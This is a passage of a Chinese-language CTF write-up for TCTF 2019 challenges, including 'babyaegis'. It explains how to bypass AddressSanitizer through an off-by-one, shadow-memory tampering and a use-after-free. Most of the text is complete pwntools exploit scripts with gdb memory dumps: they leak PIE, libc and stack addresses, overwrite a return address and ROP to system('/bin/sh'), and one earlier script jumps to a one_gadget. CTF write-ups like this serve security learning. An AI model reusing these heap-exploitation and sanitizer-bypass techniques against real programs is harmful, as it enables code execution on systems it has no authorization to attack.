del_task(4)

add_task(5, 1, 'test', '1234', 0xa0, 'FFFF')  # get twices 0xb0  
add_task(6, 1, 'test', '1234', 8, 'GGGG')   # for +0x58 cipher_point is Effective

log.info('Waiting on response')
ciphertext = get_ciphertext(16)

heap = u64(aes_decrypt(ciphertext, 'test', '1234')[:6].ljust(8, '\x00')) - 0x1280

log.success('Heap @ ' + hex(heap))

add_task(7, 1, 'test', '1234', 0x1000, 'HHHH')
add_task(8, 1, 'test', '1234', 8, 'IIII')

go(7)

del_task(7)
del_task(8)

add_task(9, 1, 'test', '1234', 0x70, p64(heap + 0x1f80) + p64(0x8) + p32(0x1) + 'test'.ljust(0x20, '\x00') + '1234'.ljust(0x10, '\x00') + p32(0x0) + p64(0x0)*2 + p64(heap + 0x1300) + p64(0x1337))
# del the 0x1000 and let the 7's data_point to the big_heap which is freed,and leak it out.
# heap + 0x1f80 is the address of big_heap which is freed
libc = u64(aes_decrypt(get_ciphertext(16), 'test', '1234')[:6].ljust(8, '\x00')) - 0x3ebca0# + i

log.success('Libc @ ' + hex(libc))

add_task(10, 1, 'test', '1234', 8, 'JJJJ')
# pause()
add_task(11, 1, 'test', '1234', 8, 'KKKK')

go(10)

del_task(10)
del_task(11)

add_task(12, 1, 'test', '1234', 0x70, p64(heap + 0x1300) + p64(0x40) + p32(0x1) + 'test'.ljust(0x20, '\x00') + '1234'.ljust(0x10, '\x00') + p32(0x0) + p64(0x0)*2 + p64(heap + 0x2350) + p64(0xc0de))
# heap + 0x1300 -->  a normal 0xb0(cipher struct)
data = ''
data += '\x00'*0x100
data += p64(heap + 0x2350 + 0x100) + p64(0x0) + p32(0x1337c0de) + p32(0x10)
data += '\x00'*(0x200 - len(data))
data += p32(0x0) + p32(0x10)
data += p64(0x0)*3
data += p64(libc + 0x00000000000E5863)  # one_gadget  (do_cipher point) ( p64(heap + 0x2350))

add_task(13, 1, 'test', '1234', 0x300, data)

p.interactive()
```
### tcache学习

+ http://p4nda.top/2018/03/20/tcache/


### babyaegis
+ AddressSanitizer: A Fast Address Sanity Checker：https://www.usenix.org/system/files/conference/atc12/atc12-final39.pdf
+ https://github.com/google/sanitizers/wiki/AddressSanitizer
+ https://github.com/Microsoft/compiler-rt/blob/master/lib/asan/asan_allocator.cc


<img src="/images/posts/tctf2019/1553848054071.png" > 

```
ShadowAddr = (Addr >> 3) + Offset;
k = *ShadowAddr;
if (k != 0 && ((Addr & 7) + AccessSize > k))
ReportAndCrash(Addr);
```
+ 所以说只要让k等于0，那我们就相当于绕过了asan，这样就能征程利用漏洞了，然后选项666可以做到
+ k=0的地方就是指针或者说是不可控制的位置，一旦这个地方被控制了，也就意味着那个地方为非0。
+ 非0至少可以理解为不可写的地方。
### 漏洞分析
这个题目主要难度在于加了asan检查，程序在update那里存在offbyone，但是普通的堆块内容跟结构体是相差很远的，所以按理来说并没有什么用，但是问题是当你分配数据大小为0x10的时候会发现数据段跟结构体是相邻的，这样一来就可以修改结构体了，然后`secret(0x0c047fff8004)`主要是为了绕过asan对`0x602000000020`这个地址的检查，以便后面可以修改覆盖这个地方的值。然后最重要的就是改成什么了，这个主要看asan源码可以看到关于这个结构体的信息：
```
// The memory chunk allocated from the underlying allocator looks like this:
// L L L L L L H H U U U U U U R R
//   L -- left redzone words (0 or more bytes)
//   H -- ChunkHeader (16 bytes), which is also a part of the left redzone.
//   U -- user memory.
//   R -- right redzone (0 or more bytes)
// ChunkBase consists of ChunkHeader and other bytes that overlap with user
// memory.

// If the left redzone is greater than the ChunkHeader size we store a magic
// value in the first uptr word of the memory block and store the address of
// ChunkBase in the next uptr.
// M B L L L L L L L L L  H H U U U U U U
//   |                    ^
//   ---------------------|
//   M -- magic value kAllocBegMagic
//   B -- address of ChunkHeader pointing to the first 'H'
static const uptr kAllocBegMagic = 0xCC6E96B9;

struct ChunkHeader {
  // 1-st 8 bytes.
  u32 chunk_state       : 8;  // Must be first.
  u32 alloc_tid         : 24;

  u32 free_tid          : 24;
  u32 from_memalign     : 1;
  u32 alloc_type        : 2;
  u32 rz_log            : 3;
  u32 lsan_tag          : 2;
  // 2-nd 8 bytes
  // This field is used for small sizes. For large sizes it is equal to
  // SizeClassMap::kMaxSize and the actual size is stored in the
  // SecondaryAllocator's metadata.
  u32 user_requested_size : 29;
  // align < 8 -> 0
  // else      -> log2(min(align, 512)) - 2
  u32 user_requested_alignment_log : 3;
  u32 alloc_context_id;
};

struct ChunkBase : ChunkHeader {
  // Header2, intersects with user memory.
  u32 free_context_id;
};

static const uptr kChunkHeaderSize = sizeof(ChunkHeader);
static const uptr kChunkHeader2Size = sizeof(ChunkBase) - kChunkHeaderSize;
COMPILER_CHECK(kChunkHeaderSize == 16);
COMPILER_CHECK(kChunkHeader2Size <= 16);

// Every chunk of memory allocated by this allocator can be in one of 3 states:
// CHUNK_AVAILABLE: the chunk is in the free list and ready to be allocated.
// CHUNK_ALLOCATED: the chunk is allocated and not yet freed.
// CHUNK_QUARANTINE: the chunk was freed and put into quarantine zone.
enum {
  CHUNK_AVAILABLE  = 0,  // 0 is the default value even if we didn't set it.
  CHUNK_ALLOCATED  = 2,
  CHUNK_QUARANTINE = 3
};

https://github.com/Microsoft/compiler-rt/blob/master/lib/asan/asan_allocator.cc
```
根据所查的资料，进行一系列的update修改，后面再delete的时候才算成功把堆块释放，否则会因为asan的特性free会不释放堆块，这样后面再add的时候就不能覆盖到原来的堆块上了。
```
update_note(0, "c" * 0x10 + "\x02\x02", str(0xff0fffffff000041))
update_note(0, "c" * 0x10 + "\x02\x86\x86", str(0x0000faffffff007b))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b", str(0xfffffffaffff0041))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41", str(0xfffffffffaff00ff))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41\xff", str(0xfffffffffa0001))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41\x42\x43", str(0xffffffff0001))
update_note(0, "c" * 0x10 + p64(0xffffff00000002), str(0xffffffffffff0002))
```
因为前面update时候刚好让数据段覆盖到了结构体，再经过delete之后再add时的结构体与数据刚好错位，也就是add时候的数据段也就是前面的结构体，这样就能UAF，就可以泄露数据和任意地址写了；最后我们泄露出栈地址，写返回地址就可以getshell了，当然其中还有一些小细节问题就需要多调试。
### 详细脚本解释(带调试信息)
```
from pwn import *
import sys, time

ip = "111.186.63.209"
port = "6666"

if len(sys.argv) == 1:
    p = process(["./aegis"])

else:
    p = remote(ip, port)

elf = ELF("./aegis")
libc = ELF("./libc-2.27.so")
context.binary = "./aegis"

def add_note(size, cont, ID):
    p.sendlineafter("Choice:", "1")
    p.sendlineafter("Size:", str(size))
    p.sendafter("Content:", cont)
    p.sendlineafter("ID:", ID);

def show_note(idx):
    p.sendlineafter("Choice:", "2")
    p.sendlineafter("Index:", str(idx))

def update_note(idx, cont, ID):
    p.sendlineafter("Choice:", "3")
    p.sendlineafter("Index:", str(idx))
    p.sendafter("Content:", cont)
    p.sendlineafter("ID:", ID);

def delete_note(idx):
    p.sendlineafter("Choice:", "4")
    p.sendlineafter("Index:", str(idx))

def secret(addr):
    p.sendlineafter("Choice:", "666")
    p.sendlineafter("Number:", str(addr))

context.log_level = "debug"

for i in xrange(1):
    add_note(0x10, chr(0x31 + i) * 0x8, str(0x4141424241414242))        # 0

add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 1
add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 2
add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 3
# pause()
add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 4
'''
gdb-peda$ x/50xg 0x0000602000000000
0x602000000000:	0x02ffffff00000002	0x5080000120000010
0x602000000010:	0x4231313131313131	0xbe41414242414142

0x602000000020:	0x02ffffff00000002	0x1580000120000010

0x602000000030:	0x0000602000000010	0x000055b1ddb1bab0
0x602000000040:	0x02ffffff00000002	0x5080000120000010
0x602000000050:	0x4231313131313131	0xbe00000000414142
0x602000000060:	0x02ffffff00000002	0x1580000120000010
0x602000000070:	0x0000602000000050	0x000055b1ddb1bab0
0x602000000080:	0x02ffffff00000002	0x5080000120000010
0x602000000090:	0x4231313131313131	0xbe00000000414142
0x6020000000a0:	0x02ffffff00000002	0x1580000120000010
0x6020000000b0:	0x0000602000000090	0x000055b1ddb1bab0
0x6020000000c0:	0x02ffffff00000002	0x5080000120000010
0x6020000000d0:	0x4231313131313131	0xbe00000000414142
0x6020000000e0:	0x02ffffff00000002	0x1580000120000010
0x6020000000f0:	0x00006020000000d0	0x000055b1ddb1bab0
0x602000000100:	0x02ffffff00000002	0x5080000120000010
0x602000000110:	0x4231313131313131	0xbe00000000414142
0x602000000120:	0x02ffffff00000002	0x1580000120000010
0x602000000130:	0x0000602000000110	0x000055b1ddb1bab0

0x55bd88727cc0 --> 0x602000000030 --> 0x602000000010 ("1111111BBAABBAA\276\002")
'''
  
secret(0x0c047fff8004)

'''
hex((0x602000000020 >> 3 ) + 0x7fff8000)  = 0x0c047fff8004
hex((0x602000000000 >> 3 ) + 0x7fff8000)  = 0x0c047fff8000

0xc047fff8002:	0xfafa0000fafa0000	0xfafa0000fafa0000
0xc047fff8012:	0xfafa0000fafa0000	0xfafa0000fafa0000
0xc047fff8022:	0xfafa0000fafa0000	0xfafafafafafafafa

0x602000000020 is the point which malloc return. # 0
codebase + 0xFB0CC0
0x0000602000000000

bb 0x114472
bb 0x1145C6
bb 0x11478A
bb 0x1148C6
bb 0x11496A secret
bb 0x114947 secret mov 0
// The memory chunk allocated from the underlying allocator looks like this:
// L L L L L L H H U U U U U U R R
//   L -- left redzone words (0 or more bytes)
//   H -- ChunkHeader (16 bytes), which is also a part of the left redzone.
//   U -- user memory.
//   R -- right redzone (0 or more bytes)
// ChunkBase consists of ChunkHeader and other bytes that overlap with user
// memory.

// If the left redzone is greater than the ChunkHeader size we store a magic
// value in the first uptr word of the memory block and store the address of
// ChunkBase in the next uptr.
// M B L L L L L L L L L  H H U U U U U U
//   |                    ^
//   ---------------------|
//   M -- magic value kAllocBegMagic
//   B -- address of ChunkHeader pointing to the first 'H'
static const uptr kAllocBegMagic = 0xCC6E96B9;

struct ChunkHeader {
  // 1-st 8 bytes.
  u32 chunk_state       : 8;  // Must be first.
  u32 alloc_tid         : 24;

  u32 free_tid          : 24;
  u32 from_memalign     : 1;
  u32 alloc_type        : 2;
  u32 rz_log            : 3;
  u32 lsan_tag          : 2;
  // 2-nd 8 bytes
  // This field is used for small sizes. For large sizes it is equal to
  // SizeClassMap::kMaxSize and the actual size is stored in the
  // SecondaryAllocator's metadata.
  u32 user_requested_size : 29;
  // align < 8 -> 0
  // else      -> log2(min(align, 512)) - 2
  u32 user_requested_alignment_log : 3;
  u32 alloc_context_id;
};

struct ChunkBase : ChunkHeader {
  // Header2, intersects with user memory.
  u32 free_context_id;
};

static const uptr kChunkHeaderSize = sizeof(ChunkHeader);
static const uptr kChunkHeader2Size = sizeof(ChunkBase) - kChunkHeaderSize;
COMPILER_CHECK(kChunkHeaderSize == 16);
COMPILER_CHECK(kChunkHeader2Size <= 16);

// Every chunk of memory allocated by this allocator can be in one of 3 states:
// CHUNK_AVAILABLE: the chunk is in the free list and ready to be allocated.
// CHUNK_ALLOCATED: the chunk is allocated and not yet freed.
// CHUNK_QUARANTINE: the chunk was freed and put into quarantine zone.
enum {
  CHUNK_AVAILABLE  = 0,  // 0 is the default value even if we didn't set it.
  CHUNK_ALLOCATED  = 2,
  CHUNK_QUARANTINE = 3
};

https://github.com/Microsoft/compiler-rt/blob/master/lib/asan/asan_allocator.cc
'''

# overwrite index 0 chunk header
#update_note(0, "c" * 0x10 + "\x03" * 2, str(0x9002ffffff001111))

update_note(0, "c" * 0x10 + "\x02\x02", str(0xff0fffffff000041))
update_note(0, "c" * 0x10 + "\x02\x86\x86", str(0x0000faffffff007b))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b", str(0xfffffffaffff0041))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41", str(0xfffffffffaff00ff))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41\xff", str(0xfffffffffa0001))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41\x42\x43", str(0xffffffff0001))
update_note(0, "c" * 0x10 + p64(0xffffff00000002), str(0xffffffffffff0002))
#show_note(0)
# if no this action ,malloc the note after delete the note,it will behide the note 4,not overflow the note 0
# so why??? may be we should search more information about asan.
# https://github.com/Microsoft/compiler-rt/blob/master/lib/asan/asan_allocator.cc
'''
gdb-peda$ x /50xg 0x602000000000
0x602000000000:	0x02ffffff00000002	0x0f80000120000010
0x602000000010:	0x6363636363636363	0x6363636363636363

0x602000000020:	0x02ffffff00000002	0x1fffffffffffff00

0x602000000030:	0x0000602000000010	0x000055bd8788bab0

0x602000000040:	0x02ffffff00000002	0x0f80000120000010
0x602000000050:	0x4231313131313131	0xbe00000000414142

0x602000000060:	0x02ffffff00000002	0x1f00000120000010

0x602000000070:	0x0000602000000050	0x000055bd8788bab0

0x602000000080:	0x02ffffff00000002	0x0f80000120000010
0x602000000090:	0x4231313131313131	0xbe00000000414142
0x6020000000a0:	0x02ffffff00000002	0x1f00000120000010
0x6020000000b0:	0x0000602000000090	0x000055bd8788bab0
0x6020000000c0:	0x02ffffff00000002	0x0f80000120000010
0x6020000000d0:	0x4231313131313131	0xbe00000000414142
0x6020000000e0:	0x02ffffff00000002	0x1f00000120000010
0x6020000000f0:	0x00006020000000d0	0x000055bd8788bab0
0x602000000100:	0x02ffffff00000002	0x0f80000120000010
0x602000000110:	0x4231313131313131	0xbe00000000414142
0x602000000120:	0x02ffffff00000002	0x1f00000120000010
0x602000000130:	0x0000602000000110	0x000055bd8788bab0
'''
delete_note(4)
delete_note(3)
delete_note(2)
delete_note(1)
delete_note(0)
'''
gdb-peda$ x /50xg 0x602000000000
0x602000000000:	0x0200000000000000	0x0f80000120000010
0x602000000010:	0x636363637c000001	0x6363636363636363
0x602000000020:	0x0200000000000000	0x1fffffffffffff00
0x602000000030:	0x000060200f000001	0x000055bd8788bab0
0x602000000040:	0x0200000000000000	0x0f80000120000010
0x602000000050:	0x423131317c000001	0xbe00000000414142
0x602000000060:	0x0200000000000000	0x1f00000120000010
0x602000000070:	0x000060200f000001	0x000055bd8788bab0
0x602000000080:	0x0200000000000000	0x0f80000120000010
0x602000000090:	0x423131317c000001	0xbe00000000414142
0x6020000000a0:	0x0200000000000000	0x1f00000120000010
0x6020000000b0:	0x000060200f000001	0x000055bd8788bab0
0x6020000000c0:	0x0200000000000000	0x0f80000120000010
0x6020000000d0:	0x423131317c000001	0xbe00000000414142
0x6020000000e0:	0x0200000000000000	0x1f00000120000010
0x6020000000f0:	0x000060200f000001	0x000055bd8788bab0
0x602000000100:	0x0200000000000000	0x0f80000120000010
0x602000000110:	0x423131317c000001	0xbe00000000414142
0x602000000120:	0x0200000000000000	0x1f00000120000010
0x602000000130:	0x000060200f000001	0x000055bd8788bab0
'''
add_note(0x10, p64(0x602000000018), str(0x0))       # 5
'''
gdb-peda$ x /50xg 0x602000000000
0x602000000000:	0x02ffffff00000002	0x1f00000120000010
0x602000000010:	0x0000602000000030	0x000055bd8788bab0
0x602000000020:	0x02ffffff00000002	0x0f80000120000010
0x602000000030:	0x0000602000000018	0xbe00000000000000
0x602000000040:	0x0200000000000000	0x0f80000120000010
0x602000000050:	0x423131317c000001	0xbe00000000414142
0x602000000060:	0x0200000000000000	0x1f00000120000010
0x602000000070:	0x000060200f000001	0x000055bd8788bab0
0x602000000080:	0x0200000000000000	0x0f80000120000010
0x602000000090:	0x423131317c000001	0xbe00000000414142
0x6020000000a0:	0x0200000000000000	0x1f00000120000010
0x6020000000b0:	0x000060200f000001	0x000055bd8788bab0
0x6020000000c0:	0x0200000000000000	0x0f80000120000010
0x6020000000d0:	0x423131317c000001	0xbe00000000414142
0x6020000000e0:	0x0200000000000000	0x1f00000120000010
0x6020000000f0:	0x000060200f000001	0x000055bd8788bab0
0x602000000100:	0x0200000000000000	0x0f80000120000010
0x602000000110:	0x423131317c000001	0xbe00000000414142
0x602000000120:	0x0200000000000000	0x1f00000120000010
0x602000000130:	0x000060200f000001	0x000055bd8788bab0
'''
p.sendline("2")
print p.recv()
p.sendline("0")
print p.recvuntil("Content: ")

pie = u64(p.recv(6).ljust(8, "\x00")) - 0x114AB0
#print p.recv()

elf.address = pie

add_note(0x10, p64(elf.got['puts']), str(0x0))      # 6

p.sendline("2")
print p.recv()
p.sendline("1")
libc.address =  u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00")) - libc.symbols['puts']
#print p.recv()

cfi = elf.address + 0x114ab0
environ = libc.address + 0x3ee098
hook = libc.address + 0x7ae140
gets = libc.address + 0x800b0

add_note(0x10, p64(environ), str(0x0))      # 6

p.sendline("2")
print p.recv()
p.sendline("2")
stack = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00")) - 336

print 'pie ->',hex(elf.address)
print 'libc ->', hex(libc.address)
print 'stack ->', hex(stack)  # ret_addr of stack
print 'gets ->', hex(gets)


p.sendline("a")
add_note(0x10, p64(0xdeadbeefcafebabe), str(0x41))        # 8
update_note(8, p64(stack) + "A", str(cfi))
p.sendlineafter("Choice:", "3")
p.sendlineafter("Index:", "3")
#pause()
gdb.attach(p)# b *gets,and rsi is the buffer of gets.and this is the return value's addr in the stack.
# b *0x113EBA+codebase
p.sendline(p64(gets)[:-2]) # content read_until_nl_or_max's ret addr --> gets


pop1rdi = elf.address + 0x000000000001c843
system = libc.address + 0x4f440
binsh = libc.address + 0x1b3e9a

p.sendline("11" + p64(pop1rdi) + p64(binsh) + p64(system) * 2) # ID

p.interactive()
```

### 脚本
```
from pwn import *
import sys, time

ip = "111.186.63.209"
port = "6666"

if len(sys.argv) == 1:
    p = process(["./aegis"])

else:
    p = remote(ip, port)

elf = ELF("./aegis")
libc = ELF("./libc-2.27.so")
context.binary = "./aegis"

def add_note(size, cont, ID):
    p.sendlineafter("Choice:", "1")
    p.sendlineafter("Size:", str(size))
    p.sendafter("Content:", cont)
    p.sendlineafter("ID:", ID);

def show_note(idx):
    p.sendlineafter("Choice:", "2")
    p.sendlineafter("Index:", str(idx))

def update_note(idx, cont, ID):
    p.sendlineafter("Choice:", "3")
    p.sendlineafter("Index:", str(idx))
    p.sendafter("Content:", cont)
    p.sendlineafter("ID:", ID);

def delete_note(idx):
    p.sendlineafter("Choice:", "4")
    p.sendlineafter("Index:", str(idx))

def secret(addr):
    p.sendlineafter("Choice:", "666")
    p.sendlineafter("Number:", str(addr))

context.log_level = "debug"

for i in xrange(1):
    add_note(0x10, chr(0x31 + i) * 0x8, str(0x4141424241414242))        # 0

add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 1
add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 2
add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 3
# pause()
add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 4
secret(0x0c047fff8004)

# overwrite index 0 chunk header

update_note(0, "c" * 0x10 + "\x02\x02", str(0xff0fffffff000041))
update_note(0, "c" * 0x10 + "\x02\x86\x86", str(0x0000faffffff007b))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b", str(0xfffffffaffff0041))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41", str(0xfffffffffaff00ff))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41\xff", str(0xfffffffffa0001))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41\x42\x43", str(0xffffffff0001))
update_note(0, "c" * 0x10 + p64(0xffffff00000002), str(0xffffffffffff0002))
#show_note(0)
# if no this action ,malloc the note after delete the note,it will behide the note 4,not overflow the note 0
# so why??? may be we should search more information about asan.
# https://github.com/Microsoft/compiler-rt/blob/master/lib/asan/asan_allocator.cc

delete_note(4)
delete_note(3)
delete_note(2)
delete_note(1)
delete_note(0)

add_note(0x10, p64(0x602000000018), str(0x0))       # 5

p.sendline("2")
print p.recv()
p.sendline("0")
print p.recvuntil("Content: ")

pie = u64(p.recv(6).ljust(8, "\x00")) - 0x114AB0
#print p.recv()

elf.address = pie

add_note(0x10, p64(elf.got['puts']), str(0x0))      # 6

p.sendline("2")
print p.recv()
p.sendline("1")
libc.address =  u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00")) - libc.symbols['puts']
#print p.recv()

cfi = elf.address + 0x114ab0
environ = libc.address + 0x3ee098
hook = libc.address + 0x7ae140
gets = libc.address + 0x800b0

add_note(0x10, p64(environ), str(0x0))      # 6

p.sendline("2")
print p.recv()
p.sendline("2")
stack = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00")) - 336

print 'pie ->',hex(elf.address)
print 'libc ->', hex(libc.address)
print 'stack ->', hex(stack)  # ret_addr of stack
print 'gets ->', hex(gets)


p.sendline("a")
add_note(0x10, p64(0xdeadbeefcafebabe), str(0x41))        # 8
update_note(8, p64(stack) + "A", str(cfi))
p.sendlineafter("Choice:", "3")
p.sendlineafter("Index:", "3")
#pause()
gdb.attach(p)# b *gets,and rsi is the buffer of gets.and this is the return value's addr in the stack.
# b *0x113EBA+codebase
p.sendline(p64(gets)[:-2]) # content read_until_nl_or_max's ret addr --> gets


pop1rdi = elf.address + 0x000000000001c843
system = libc.address + 0x4f440
binsh = libc.address + 0x1b3e9a

p.sendline("11" + p64(pop1rdi) + p64(binsh) + p64(system) * 2) # ID

p.interactive()
```
